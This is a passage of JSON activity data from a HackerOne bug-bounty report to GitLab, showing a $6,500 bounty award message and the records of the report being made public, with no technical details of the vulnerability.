today.\u003c/p\u003e\n\n\u003cp\u003eThanks,\u003cbr\u003e\nAlex\u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-05T20:00:04.502Z","updated_at":"2020-10-05T20:00:04.502Z","actor":{"username":"ajxchapman","cleared":true,"url":"/ajxchapman","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/141/831/67daf6985b76c1867ff3f442fe5910bb329ee0b4_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9428006,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hello @ajxchapman,\n\nThank you again for the report! We are awarding a bounty. Congratulations!\n\nPlease let us know if you find that our patch does not mitigate your finding. Your report will be published in 30 days in GitLab's issue tracker.\n\nWe look forward to your next report!\n\nBest regards,\nGitLab Security Team","markdown_message":"\u003cp\u003eHello \u003ca href=\"/ajxchapman\"\u003e@ajxchapman\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you again for the report! We are awarding a bounty. Congratulations!\u003c/p\u003e\n\n\u003cp\u003ePlease let us know if you find that our patch does not mitigate your finding. Your report will be published in 30 days in GitLab\u0026#39;s issue tracker.\u003c/p\u003e\n\n\u003cp\u003eWe look forward to your next report!\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nGitLab Security Team\u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-06T04:46:48.272Z","updated_at":"2020-10-06T04:46:48.272Z","actor":{"url":"/gitlab","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"GitLab"}},"bounty_amount":"6500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"gitlab","collaborator":{"username":"ajxchapman","url":"/ajxchapman"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9719076,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-11-03T22:20:39.552Z","updated_at":"2020-11-03T22:20:39.552Z","first_to_agree":true,"actor":{"username":"dcouture","cleared":false,"url":"/dcouture","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9721484,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-11-04T08:35:20.679Z","updated_at":"2020-11-04T08:35:20.679Z","actor":{"username":"ajxchapman","cleared":true,"url":"/ajxchapman","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/141/831/67daf6985b76c1867ff3f442fe5910bb329ee0b4_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9721485,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-11-04T08:35:20.759Z","updated_at":"2020-11-04T08:35:20.759Z","actor":{"username":"ajxchapman","cleared":true,"url":"/ajxchapman","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/141/831/67daf6985b76c1867ff3f442fe5910bb329ee0b4_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}